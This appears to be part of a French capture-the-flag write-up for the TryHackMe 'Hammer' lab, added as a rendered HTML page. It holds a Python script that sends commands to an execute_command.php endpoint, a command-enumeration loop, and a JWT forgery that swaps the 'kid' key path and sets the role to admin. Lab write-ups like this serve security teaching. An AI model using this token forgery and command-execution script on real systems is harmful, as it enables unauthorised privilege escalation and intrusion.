+</span></span><span style="display:flex;"><span>parser.add_argument<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;command&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parser.parse_args<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests.Session<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>PASS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password123&#34;</span>
+</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://hammer.thm:1337/index.php&#34;</span>
+</span></span><span style="display:flex;"><span>URL_exec<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://hammer.thm:1337//execute_command.php&#34;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>delay<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s.get<span style="color:#f92672">(</span>URL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>co <span style="color:#f92672">=</span> s.post<span style="color:#f92672">(</span>URL, data<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;email&#34;</span>:<span style="color:#e6db74">&#34;tester@hammer.thm&#34;</span>, <span style="color:#e6db74">&#39;password&#39;</span>:PASS<span style="color:#f92672">}</span>, headers<span style="color:#f92672">=</span>headers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(co.text)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/json&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> re.search<span style="color:#f92672">(</span>r<span style="color:#e6db74">&#34;var jwtToken = &#39;(.*?)&#39;&#34;</span>, co.text<span style="color:#f92672">)</span>.group<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> urllib.parse.quote_plus<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ls&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>headers<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;Authorization&#34;</span><span style="color:#f92672">]=</span>f<span style="color:#e6db74">&#34;Bearer {token}&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stdout <span style="color:#f92672">=</span> s.post<span style="color:#f92672">(</span>URL_exec, json<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;command&#34;</span>:args.command<span style="color:#f92672">}</span>, headers<span style="color:#f92672">=</span>headers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>try :
+</span></span><span style="display:flex;"><span>	print<span style="color:#f92672">(</span>stdout.json<span style="color:#f92672">()[</span><span style="color:#e6db74">&#34;output&#34;</span><span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>except : 
+</span></span><span style="display:flex;"><span>	print<span style="color:#f92672">(</span>stdout.json<span style="color:#f92672">()[</span><span style="color:#e6db74">&#34;error&#34;</span><span style="color:#f92672">])</span>
+</span></span></code></pre></div><h3 id="local-enumération">
+  Local Enumération
+  
+  <a class="anchor" href="#local-enum%c3%a9ration">#</a>
+  
+</h3>
+<p>Cela nous permet d’énumérer les commandes possibles et on s’aperçoit que seule la commande ls est autorisée. La suite du problème sera donc dans les fichiers disponibles dans notre dossier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-82-106-93:~# <span style="color:#66d9ef">for</span> c in <span style="color:#66d9ef">$(</span>ls /bin<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>   python3 exec_cmd.py <span style="color:#e6db74">&#34;</span>$c<span style="color:#e6db74">&#34;</span> | grep -v <span style="color:#e6db74">&#34;Command not allowed&#34;</span> <span style="color:#f92672">&amp;&amp;</span> echo $c ; <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span>188ade1.key
+</span></span><span style="display:flex;"><span>composer.json
+</span></span><span style="display:flex;"><span>config.php
+</span></span><span style="display:flex;"><span>dashboard.php
+</span></span><span style="display:flex;"><span>execute_command.php
+</span></span><span style="display:flex;"><span>hmr_css
+</span></span><span style="display:flex;"><span>hmr_images
+</span></span><span style="display:flex;"><span>hmr_js
+</span></span><span style="display:flex;"><span>hmr_logs
+</span></span><span style="display:flex;"><span>index.php
+</span></span><span style="display:flex;"><span>logout.php
+</span></span><span style="display:flex;"><span>reset_password.php
+</span></span><span style="display:flex;"><span>vendor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ls
+</span></span></code></pre></div><p>Il y a un fichier 188ade1.key qui peut potentiellement nous permettre de chiffrer le jwt avec une autre clé et donc changer de compte pour élever nos privilèges.  Cette clé est téléchargeable : <a href="http://hammer.thm:1337/i88ade1.key">http://hammer.thm:1337/i88ade1.key</a>.
+On sait que notre application se trouve dans <strong>/var/www/html</strong> comme vu dans les logs que nous avons trouvé lors de la phase d’énumération.</p>
+<h1 id="post-exploitation--escalade-de-privilège">
+  Post Exploitation : Escalade de privilège
+  
+  <a class="anchor" href="#post-exploitation--escalade-de-privil%c3%a8ge">#</a>
+  
+</h1>
+<h2 id="faille">
+  Faille
+  
+  <a class="anchor" href="#faille">#</a>
+  
+</h2>
+<p>En observant le code source de la page, on s’aperçoit que celle-ci appelle une API sécurisée par un token JWT dont le payload et le header sont :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;typ&#34;</span>: <span style="color:#e6db74">&#34;JWT&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;HS256&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;/var/www/mykey.key&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;iss&#34;</span>: <span style="color:#e6db74">&#34;http://hammer.thm&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;aud&#34;</span>: <span style="color:#e6db74">&#34;http://hammer.thm&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;iat&#34;</span>: 1764006630,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;exp&#34;</span>: 1764010230,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;data&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;user_id&#34;</span>: 1,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;tester@hammer.thm&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>On modifie les champs kid et role JWT pour avoir les droits admin et on crée une nouvelle signature avec la clé téléchargée :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;typ&#34;</span>: <span style="color:#e6db74">&#34;JWT&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;HS256&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;/var/www/html/188ade1.key&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;iss&#34;</span>: <span style="color:#e6db74">&#34;http://hammer.thm&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;aud&#34;</span>: <span style="color:#e6db74">&#34;http://hammer.thm&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;iat&#34;</span>: 1764006630,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;exp&#34;</span>: 1764010230,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;data&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;user_id&#34;</span>: 1,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;tester@hammer.thm&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="exploit">
+  Exploit
+  
+  <a class="anchor" href="#exploit">#</a>
+  
+</h2>
+<p>En modifiant le payload JWT dans notre script  et en changeant la clé qui est utilisé pour signer le token, on obtient les droits admin sur l’API, ce qui nous permet d’exécuter n’importe quelle commande et de retrouver le drapeau :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ip-10-80-65-226:~# python3 ./exec_command.py <span style="color:#e6db74">&#34;cat /home/ubuntu/flag.txt&#34;</span>
+</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>XXXXXXXXXXXXXXXX<span style="color:#f92672">}</span>
+</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/writeups/vm/" class="flex align-center book-icon">
+        <img src="/svg/backward.svg" class="book-icon" alt="Previous" title="Virtual Machines" />
+        <span>Virtual Machines</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/writeups/vm/collapsed/mrrobot/" class="flex align-center book-icon">
+        <span>Mr Robot</span>
+        <img src="/svg/forward.svg" class="book-icon" alt="Next" title="Mr Robot" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+
+<aside class="book-toc">
+  <div class="book-toc-content">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#port-enumeration">Port Enumeration</a></li>
+        <li><a href="#directory-enumeration">Directory Enumeration</a></li>
+        <li><a href="#logs">Logs</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#controunement-des-limitation">Controunement des limitation</a></li>
+        <li><a href="#réinitialisation-du-mot-de-passe">Réinitialisation du mot de passe</a></li>
+        <li><a href="#commandes-dadministration">Commandes d&rsquo;administration</a></li>
+        <li><a href="#local-enumération">Local Enumération</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#faille">Faille</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+  </ul>
+</nav>
+
+
+
+  </div>
+</aside>
+
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
